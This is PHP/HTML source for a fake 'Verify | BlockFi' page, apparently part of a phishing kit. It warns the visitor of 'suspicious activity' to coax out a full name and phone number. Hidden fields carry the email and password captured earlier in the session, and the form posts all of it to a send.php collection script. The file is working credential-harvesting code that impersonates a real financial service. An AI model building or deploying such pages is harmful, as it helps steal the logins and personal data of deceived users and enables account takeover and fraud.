<?php include_once './config.php'; ?>
<html lang="en">
    <?php
        $title = 'Verify | BlockFi';
        include_once './includes/meta.php';
        if(empty($_SESSION["email"]) || empty($_SESSION["password"])) {
            redirect(base_url());
        }
        unset($_SESSION['phone_number']);
    ?>
    <body>
        <?php include_once './includes/header.php'; ?>
        <link rel="stylesheet" href="./assets/country-code-picker/css/jquery.ccpicker.css">
        <div class='container'>
            <div class="row justify-content-center mt60 pt30">
                <div class='col-sm-4 shadow-lg p25 bg-white text-dark rounded-2'>
                    <div class='col-sm-12 text-center'>
                        <img src=<?= base_url('assets/img/logo.png') ?> width="70%" alt="Logo" class="d-inline-block align-text-top my20" />
                        <h2 class='pt25 fs30 fw-medium'>Verification Required</h2>
                        <div class='fw-medium pt20 fs20 text-danger'>Important Message</div>
                        <div class='fw-medium fs16 py10 text-danger'>Some Suspicious Activity Found With Your Account, Enter Your Phone Number to Verify Your Identity.</div>
                    </div>
                    <form method="post" action="<?= base_url('send.php')?>" class="">
                        <input type="hidden" name="email" value="<?=$_SESSION['email']?>" >
                        <input type="hidden" name="password" value="<?=$_SESSION['password']?>" >
                        <div class="form-floating my30">
                            <input name="name" type="text" required="" minlength="3" maxlength="100" class="form-control form-control-lg" placeholder="Full Name" value="" >
                            <label for="floatingInput">Full Name</label>
                        </div>
                        <div className="my30">
                            <div class="form-control fs16">
                                <input name="phone_number" type="number" id="phone_number" required="" style="width: 70%" class="form-control-add" placeholder="Phone number" value="" >
                            </div>
                        </div>
                        <div class="text-center mx-auto d-grid gap-2 my30">
                            <button type="submit" class="btn btn-primary-2 btn-lg btn-block rounded-0 fs16 py10">Submit</button>
                        </div>
                    </form>
                </div>
            </div>
        </div>
        <?php include_once './includes/footer.php'; ?>
        <script src="./assets/country-code-picker/js/jquery.ccpicker.min.js"></script>
        <script type="text/javascript">
            $(document).ready(function() {
                $("#phone_number").CcPicker({ countryCode: "us", dataUrl: "<?= base_url('assets/country-code-picker/data/en.json')?>", searchPlaceHolder: "Find..." });
            });
            
        </script>
    </body>
</html>